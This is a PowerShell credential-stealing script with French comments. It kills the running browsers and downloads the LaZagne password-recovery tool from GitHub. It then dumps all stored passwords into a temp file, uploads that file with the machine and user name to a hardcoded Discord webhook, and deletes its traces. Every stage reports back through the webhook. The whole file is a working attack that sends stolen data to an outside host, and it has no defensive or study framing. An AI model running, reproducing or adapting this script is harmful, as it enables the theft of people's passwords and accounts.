$wh="https://discord.com/api/webhooks/1467465390576766998/4_TcKXgnZalThMN2QWyUY3q-H_IPWFR_Y1C2YqXnVcM-G_cxPZeTatGBSkTtCIRr_yGX"

function Send-Discord {
    param([string]$msg)
    try {
        $Body = @{content=$msg} | ConvertTo-Json
        Invoke-RestMethod -Uri $wh -Method Post -Body $Body -ContentType 'application/json' | Out-Null
    } catch {}
}

Send-Discord "🟢 **START** - PC: $env:COMPUTERNAME | User: $env:USERNAME"

# Tuer navigateurs
@("chrome","msedge","firefox","brave","opera") | ForEach-Object {
    Get-Process -Name $_ -EA 0 | Stop-Process -Force -EA 0
}

Start-Sleep 3

Set-Location $env:TEMP
Remove-Item lazagne.exe,passwords.txt -Force -EA 0

Send-Discord "📥 **Downloading LaZagne...**"

try {
    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
    
    # Télécharger LaZagne (outil Python compilé)
    Invoke-WebRequest -Uri "https://github.com/AlessandroZ/LaZagne/releases/download/v2.4.6/LaZagne.exe" -OutFile "lazagne.exe" -UseBasicParsing
    
    if (!(Test-Path "lazagne.exe")) {
        Send-Discord "❌ **Download failed**"
        exit
    }
    
    Send-Discord "🔓 **Extracting all passwords...**"
    
    # Exécuter LaZagne
    .\lazagne.exe all -oN passwords.txt
    
    Start-Sleep 2
    
    if (Test-Path "passwords.txt") {
        $size = [math]::Round((Get-Item "passwords.txt").Length / 1KB, 2)
        Send-Discord "📤 **Uploading results ($size KB)...**"
        
        $date = Get-Date -Format 'yyyy-MM-dd HH:mm:ss'
        curl.exe -F "file=@passwords.txt" -F "content=🔑 **ALL PASSWORDS EXTRACTED**`n**PC:** $env:COMPUTERNAME`n**User:** $env:USERNAME`n**Size:** $size KB`n**Date:** $date" $wh
        
        Send-Discord "✅ **Upload SUCCESS**"
    } else {
        Send-Discord "❌ **No output file created**"
    }
    
} catch {
    $err = $_.Exception.Message
    Send-Discord "❌ **Error:** $err"
}

Remove-Item lazagne.exe,passwords.txt -Force -EA 0
Send-Discord "🧹 **FINISHED**"
